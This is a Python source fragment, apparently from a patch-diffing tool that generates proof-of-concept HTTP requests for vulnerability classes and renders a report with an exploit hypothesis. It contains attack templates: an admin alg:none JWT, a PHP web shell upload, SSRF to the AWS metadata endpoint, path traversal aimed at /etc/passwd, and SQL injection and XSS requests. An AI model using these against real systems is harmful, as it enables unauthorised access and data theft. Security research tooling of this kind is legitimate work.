    lines = []
    if analysis.fix_class in ("auth_bypass", "missing_auth_bypass"):
        # Auth bypass: show both with and without auth header
        lines.append(f"# PoC: {analysis.fix_class} — {analysis.vuln_pattern}")
        lines.append(f"# Sends request WITHOUT authentication to {endpoint}")
        if http_method.upper() == "GET":
            lines.append(f"GET {endpoint} HTTP/1.1")
        else:
            lines.append(f"POST {endpoint} HTTP/1.1")
        lines.append(f"Host: {_host}")
        lines.append("# No Authorization header — test for missing auth")
        if http_method.upper() == "POST":
            lines.append("")
            lines.append("{}")
        lines.append("")
        lines.append("# Expected: 200 OK with private data (not 401/403)")
        lines.append(f"# Vulnerable function: {analysis.vuln_function} in {analysis.vuln_file}")

    elif analysis.fix_class in ("sqli", "injection") and param and payload:
        lines.append(f"# PoC: {analysis.fix_class} — {analysis.vuln_pattern}")
        if http_method.upper() == "GET":
            lines.append(f"GET {endpoint}?{param}={payload.replace(' ', '%20')} HTTP/1.1")
        else:
            lines.append(f"POST {endpoint} HTTP/1.1")
            lines.append(f"Host: {_host}")
            lines.append("Content-Type: application/x-www-form-urlencoded")
            if auth_header:
                lines.append(f"Authorization: {auth_header}")
            lines.append("")
            lines.append(f"{param}={payload}")
            lines.append("")
            lines.append("# Expected: SQL error OR data returned that shouldn't be accessible")
            lines.append(f"# Vulnerable function: {analysis.vuln_function}")
            return "\n".join(lines)
        lines.append(f"Host: {_host}")
        if auth_header:
            lines.append(f"Authorization: {auth_header}")
        lines.append("")
        lines.append("# Expected: SQL error OR unauthorized data")
        lines.append(f"# Vulnerable function: {analysis.vuln_function}")

    elif analysis.fix_class in ("xss",) and param and payload:
        lines.append(f"# PoC: {analysis.fix_class} — {analysis.vuln_pattern}")
        _encoded_payload = payload.replace("<", "%3C").replace(">", "%3E").replace('"', "%22")
        if http_method.upper() == "GET":
            lines.append(f"GET {endpoint}?{param}={_encoded_payload} HTTP/1.1")
        else:
            lines.append(f"POST {endpoint} HTTP/1.1")
            lines.append(f"Host: {_host}")
            lines.append("Content-Type: application/x-www-form-urlencoded")
            lines.append("")
            lines.append(f"{param}={payload}")
            lines.append("")
            lines.append("# Expected: response body contains unescaped <script>alert...")
            return "\n".join(lines)
        lines.append(f"Host: {_host}")
        lines.append("")
        lines.append("# Expected: response body contains unescaped <script>alert...")

    elif analysis.fix_class == "path_traversal" and param and payload:
        lines.append(f"# PoC: {analysis.fix_class} — {analysis.vuln_pattern}")
        lines.append(f"GET {endpoint}?{param}={payload} HTTP/1.1")
        lines.append(f"Host: {_host}")
        lines.append("")
        lines.append("# Expected: contents of /etc/passwd in response")
        lines.append(f"# Vulnerable function: {analysis.vuln_function}")

    elif analysis.fix_class == "ssti" and param and payload:
        lines.append(f"# PoC: {analysis.fix_class} — {analysis.vuln_pattern}")
        lines.append(f"GET {endpoint}?{param}={payload} HTTP/1.1")
        lines.append(f"Host: {_host}")
        lines.append("")
        lines.append("# Expected: response contains '49' (7*7 evaluated)")

    elif analysis.fix_class == "ssrf" and param:
        _ssrf_payload = payload or "http://169.254.169.254/latest/meta-data/"
        lines.append(f"# PoC: {analysis.fix_class} — {analysis.vuln_pattern}")
        if http_method.upper() == "GET":
            lines.append(f"GET {endpoint}?{param}={_ssrf_payload} HTTP/1.1")
        else:
            lines.append(f"POST {endpoint} HTTP/1.1")
            lines.append(f"Host: {_host}")
            lines.append("Content-Type: application/json")
            if auth_header:
                lines.append(f"Authorization: {auth_header}")
            lines.append("")
            lines.append('{"' + param + '": "' + _ssrf_payload + '"}')
            lines.append("")
            lines.append("# Expected: response contains AWS metadata or internal IP response")
            return "\n".join(lines)
        lines.append(f"Host: {_host}")
        lines.append("")
        lines.append("# Expected: response contains AWS metadata or internal IP response")

    elif analysis.fix_class == "jwt_bypass":
        lines.append(f"# PoC: {analysis.fix_class} — {analysis.vuln_pattern}")
        lines.append("# Craft a JWT with alg:none or alg:HS256 signed with public key")
        lines.append(f"GET {endpoint} HTTP/1.1")
        lines.append(f"Host: {_host}")
        _alg_none_jwt = ("eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"
                         ".eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.")
        lines.append(f"Authorization: Bearer {_alg_none_jwt}")
        lines.append("")
        lines.append("# Expected: 200 OK with admin-level response (alg:none bypass)")

    elif analysis.fix_class in ("insecure_deserialization", "deserialization"):
        lines.append(f"# PoC: {analysis.fix_class} — {analysis.vuln_pattern}")
        lines.append("# Gadget chain payload required (depends on target framework)")
        lines.append(f"POST {endpoint} HTTP/1.1")
        lines.append(f"Host: {_host}")
        lines.append("Content-Type: application/x-java-serialized-object")
        lines.append("")
        lines.append("# [insert ysoserial/phpggc gadget chain payload here]")
        lines.append("# Tool: ysoserial (Java), phpggc (PHP), or pickle-payload (Python)")

    elif analysis.fix_class == "file_upload_bypass":
        lines.append(f"# PoC: {analysis.fix_class} — {analysis.vuln_pattern}")
        lines.append(f"POST {endpoint} HTTP/1.1")
        lines.append(f"Host: {_host}")
        lines.append("Content-Type: multipart/form-data; boundary=----WebKitFormBoundary")
        if auth_header:
            lines.append(f"Authorization: {auth_header}")
        lines.append("")
        lines.append("------WebKitFormBoundary")
        lines.append('Content-Disposition: form-data; name="file"; filename="shell.php.jpg"')
        lines.append("Content-Type: image/jpeg")
        lines.append("")
        lines.append("<?php system($_GET['cmd']); ?>")
        lines.append("------WebKitFormBoundary--")
        lines.append("")
        lines.append("# Expected: file uploaded, accessible as /uploads/shell.php.jpg")

    else:
        # Generic PoC hint
        if param and payload:
            lines.append(f"# PoC hint: {analysis.fix_class}")
            lines.append(f"# Parameter: {param!r}")
            lines.append(f"# Payload:   {payload!r}")
            lines.append(f"# Function:  {analysis.vuln_function} in {analysis.vuln_file}")
        else:
            return ""

    return "\n".join(lines)


def render_patchdiff(res: DiffResult) -> str:
    cve_hdr = f" ({res.cve_id})" if res.cve_id else ""
    out = [
        f"# binoracle patch-diff v2{cve_hdr}\n",
        f"- old: `{res.old}`\n- new: `{res.new}`\n"
        f"- changed functions: {len(res.changed)}\n"
        f"- patch type: **{res.patch_type.value}**\n",
    ]
    if res.top_suspect:
        t = res.top_suspect
        out.append(
            f"- top suspect: `{t.name}` "
            f"(sim={t.similarity:.2f}, delta={t.size_delta:+d}B, "
            f"score={t.security_score:.2f})\n"
        )
    out.append("## Exploit hypothesis\n")
    out.append(res.hypothesis + "\n")
    out.append("## Changed functions (radiff2, security score)\n")
    rows = sorted(res.changed, key=lambda f: f.security_score, reverse=True)[:20]
    out.append("```\n")
    out.append(f"{'function':<42} sim   delta  score\n")
    for f in rows:
        out.append(f"{f.name:<42} {f.similarity:.2f}  {f.size_delta:+5d}  {f.security_score:.2f}\n")
    out.append("```\n")
    if res.narrative:
        out.append("## LLM interpretation\n")
        out.append(res.narrative + "\n")
    out.append("## Raw radiff2 -A -C\n")
    snippet = res.raw if len(res.raw) < 6000 else res.raw[:6000] + "\n...[truncated]"
    out.append("```\n" + snippet + "\n```")
    return "\n".join(out)
